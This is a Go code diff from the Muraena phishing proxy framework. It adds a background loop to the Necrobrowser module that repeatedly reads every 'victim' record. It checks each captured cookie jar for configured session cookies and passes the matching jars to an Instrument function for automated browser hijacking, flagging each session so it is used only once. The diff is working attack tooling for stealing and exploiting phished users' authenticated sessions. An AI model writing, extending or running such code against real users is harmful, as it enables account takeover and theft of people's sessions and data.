@@ -6,11 +6,12 @@ import (
 	"strings"
 	"time"
 
+	"github.com/muraenateam/muraena/log"
+
 	"gopkg.in/resty.v1"
 
+	session "github.com/muraenateam/muraena/session"
 	"github.com/muraenateam/muraena/core/db"
-
-	"github.com/muraenateam/muraena/session"
 )
 
 const (
@@ -104,7 +105,78 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 
 	m.Request = string(bytes)
 
+	// spawn a go routine that checks all the victims cookie jars every N seconds
+	// to see if we have any sessions ready to be instrumented
+	if s.Config.NecroBrowser.Enabled {
+		go m.CheckSessions()
+	}
+
 	return
+}
+
+func (module *Necrobrowser) CheckSessions() {
+
+	triggerType := module.Session.Config.NecroBrowser.Trigger.Type
+	triggerDelay := module.Session.Config.NecroBrowser.Trigger.Delay
+
+	for {
+		switch triggerType {
+		case "cookies":
+			module.CheckSessionCookies()
+		case "path":
+			// TODO
+			log.Warning("currently unsupported. TODO implement path")
+		default:
+			log.Warning("unsupported trigger type: %s", triggerType)
+		}
+
+		time.Sleep(time.Duration(triggerDelay) * time.Second)
+	}
+}
+
+func (module *Necrobrowser) CheckSessionCookies() {
+	triggerValues := module.Session.Config.NecroBrowser.Trigger.Values
+
+	victims, err := db.GetAllVictims()
+	if err != nil {
+		module.Debug("error fetching all victims: %s", err)
+	}
+
+	module.Debug("checkSessions: we have %d victim sessions. Checking authenticated ones.. ", len(victims))
+
+	for _, vId := range victims {
+		cookieJar, err := db.GetVictimCookiejar(vId)
+		if err != nil {
+			module.Debug("error fetching victim %s: %s", vId, err)
+		}
+
+		cookiesFound := 0
+		cookiesNeeded := len(triggerValues)
+		for _, cookie := range cookieJar {
+			if Contains(&triggerValues, cookie.Name) {
+				cookiesFound++
+			}
+		}
+
+		v, _ := db.GetVictim(vId)
+
+		// if we find the cookies, and the session has not been already instrumented (== false), then instrument
+		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
+			module.Instrument(cookieJar, "[]") // TODO add credentials JSON, instead of passing empty [] array
+			// prevent the session to be instrumented twice
+			db.SetSessionAsInstrumented(vId)
+		}
+
+	}
+}
+
+func Contains(slice *[]string, find string) bool {
+	for _, a := range *slice {
+		if a == find {
+			return true
+		}
+	}
+	return false
 }
 
 func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJSON string) {
